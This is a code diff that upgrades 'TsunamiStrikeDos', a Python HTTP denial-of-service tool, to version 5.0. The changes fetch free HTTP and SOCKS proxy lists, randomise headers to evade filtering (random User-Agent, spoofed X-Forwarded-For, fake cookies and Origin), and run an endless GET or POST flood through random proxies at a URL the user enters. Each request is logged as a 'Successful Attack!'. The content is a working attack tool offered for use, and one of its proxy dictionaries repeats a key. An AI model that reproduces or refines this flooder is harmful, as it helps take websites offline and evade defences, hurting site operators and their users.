@@ -17,21 +17,26 @@ from halo import Halo
 
 
 os.system('clear')
-__version__ = '4.0.9 BETA'
+__version__ = '5.0'
 __method__ = 'HTTP'
 #  
 # --------------------------------------
 
 sip = Halo()
-
 print(f'''
+{F.WHITE} TSD TOOL {F.GREEN} |{F.WHITE} HTTP PROXY FLOOD {F.GREEN} |{F.WHITE} BY ALM7MDY
 {F.GREEN}
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+▄▄▄█████▓  ██████ ▓█████▄ 
+▓  ██▒ ▓▒▒██    ▒ ▒██▀ ██▌
+▒ ▓██░ ▒░░ ▓██▄   ░██   █▌
+░ ▓██▓ ░   ▒   ██▒░▓█▄   ▌
+  ▒██▒ ░ ▒██████▒▒░▒████▓ 
+  ▒ ░░   ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ 
+    ░    ░ ░▒  ░ ░ ░ ▒  ▒ 
+  ░      ░  ░  ░   ░ ░  ░ 
+               ░     ░    
+                   ░      
+
                 {F.CYAN} TsunamiStrikeDos V{F.GREEN} {__version__}{F.RESET}
 
 ''')
@@ -81,13 +86,15 @@ def get_http_proxies() -> List[Dict[str, str]]:
     """Return a list of available proxies from both HTTP and SOCKS4."""
     proxies = []
     try:
+        timeoutrand = random.randint(1000,50000)
+        #print(timeoutrand)
         # Fetch HTTP proxies
         with requests.get(
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+            f"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout={timeoutrand}",
             verify=False,
         ) as proxy_list_http:
             proxies_http = [
-                {"http": "http://" + proxy, "https": "http://" + proxy}
+                {"http": proxy, "https": proxy}
                 for proxy in proxy_list_http.text.split("\r\n")
                 if proxy != ""
             ]
@@ -95,21 +102,21 @@ def get_http_proxies() -> List[Dict[str, str]]:
 
         # Fetch SOCKS4 proxies
         with requests.get(
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
+            f"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4,socks5&proxy_format=ipport&format=text&timeout={timeoutrand}",
             verify=False,
         ) as proxy_list_socks4:
             proxies_socks4 = [
-                {"http": "socks4://" + proxy, "https": "socks4://" + proxy}
+                {"socks4": proxy, "socks4": proxy}
                 for proxy in proxy_list_socks4.text.split("\r\n")
                 if proxy != ""
             ]
             proxies.extend(proxies_socks4)
 
     except Timeout:
-        print(f"\n{F.RED}[ !!! ] {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
+        print(f"\n{F.RED}( !!! ) {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
         sys.exit(1)
     except ConnectionError:
-        print(f"\n{F.RED}[ !!! ] {F.CYAN}Device is not connected to the Internet!{F.RESET}")
+        print(f"\n{F.RED}( !!! ) {F.CYAN}Device is not connected to the Internet!{F.RESET}")
         sys.exit(1)
 
     return proxies
@@ -124,20 +131,36 @@ def generate_headers():
     headers = {
         "User-Agent": ua.random,  # Use random User-Agent
         "X-Requested-With": random.choice(["XMLHttpRequest", "FetchRequest"]),
-        "Connection": "keep-alive",
-        "Pragma": "no-cache",
-        "Cache-Control": "no-cache",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com", "https://www.youtube.com","https://www.instagram.com", "https://www.facebook.com/"]),
+        "Connection": random.choice(["keep-alive", "close"]),
+        "Pragma": random.choice(["no-cache", "private"]),
+        "Cache-Control": random.choice(["no-cache", "no-store", "must-revalidate"]),
+        "Accept-Encoding": random.choice(["gzip, deflate, br", "identity"]),
+        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"]),
+        "Referer": random.choice([
+            "https://www.google.com", 
+            "https://www.bing.com", 
+            "https://www.yahoo.com", 
+            "https://www.youtube.com",
+            "https://www.instagram.com", 
+            "https://www.facebook.com/"
+        ]),
         "DNT": "1",  # Do Not Track header
         "Upgrade-Insecure-Requests": "1",  # Common in browser requests
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "same-origin",
+        "Accept": random.choice([
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "application/json, text/plain, */*",
+            "*/*"
+        ]),
+        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
+        "Sec-Fetch-Site": random.choice(["same-origin", "cross-site"]),
         "Sec-Fetch-User": "?1",
         "Sec-Fetch-Dest": "document",
-        "X-Forwarded-For": fake.ipv4()
+        "X-Forwarded-For": fake.ipv4(),
+        "Origin": random.choice([
+            "https://example.com",
+            "https://testsite.org",
+            "https://mywebsite.net"
+        ])
     }
     random_cookies = generate_random_cookies()
     headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in random_cookies.items()])
@@ -148,17 +171,38 @@ def generate_headers():
 def flood(target: str) -> None:
     """Start an HTTP GET request flood through proxies."""
     global proxies
+
+    request_type = random.choice([
+        "GET",
+        "POST"
+    ])
+
     fakedata = dataRandom()
+    request_count = 0
     while True:  # Keep flooding until the program is stopped
         headers = generate_headers()
+        headers["User-Agent"] = ua.random
+        headers["X-Forwarded-For"] = fake.ipv4()
+        random_cookies = generate_random_cookies()
+        headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in random_cookies.items()])
+
+        if request_count % 50 == 0:
+            timeoutrand = random.randint(1000,50000)
         try:
             proxy = random.choice(proxies)
-            response = requests.post(target, headers=headers, proxies=proxy, timeout=5)
-            status = f"{F.GREEN if response.status_code == 200 else F.RED}( {response.status_code} ){F.RESET}"
+
+            if request_type == "POST":
+
+                response = requests.post(target, headers=headers, proxies=proxy, timeout=5)
+            else:
+                response = requests.get(target , headers=headers, proxies=proxy, timeout=5)
+            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
             payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
             ip_fake = f"IP: {headers['X-Forwarded-For']}"
-            print(f"{status}: Request Sent! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
+            request_info = f"{F.CYAN}{request_type}{F.RESET}"
+            print(f"{status}: {request_info} Successful Attack! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
+            request_count +=1
         except (Timeout, OSError):
             continue
         if response.status_code != 200:
@@ -181,10 +225,14 @@ def start_flooding(target: str, thread_count: int, duration: int) -> None:
     print(f"\n{F.CYAN}( DONE ) {F.GREEN}Attack finished after {duration} seconds.{F.RESET}")
 
 if __name__ == "__main__":
-    target_url = input(f"{F.CYAN}(?){F.RESET} target URL: {F.GREEN}")
-    num_threads = int(input(f"{F.CYAN}(?){F.RESET} threads: {F.GREEN}"))
-    duration = int(input(f"{F.CYAN}(?){F.RESET} attack duration (seconds): {F.GREEN}"))
-    sleeptime = int(input(f"{F.CYAN}(?) {F.RESET}Sleep: {F.GREEN}"))
+    target_url = input(f'''{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Enter Url{F.CYAN})
+    └──╼ {F.YELLOW}~: {F.GREEN}\n''')
+    num_threads = int(input(f'''{F. CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
+    └──╼ {F.YELLOW}~: {F.GREEN}\n'''))
+    duration = int(input(f'''{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})
+    └──╼ {F.YELLOW}~: {F.GREEN}\n'''))
+    sleeptime = int(input(f'''{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Sleep Time{F.CYAN})
+    └──╼ {F.YELLOW}~: {F.GREEN}\n'''))
 
     start_flooding(target_url, num_threads, duration)
 
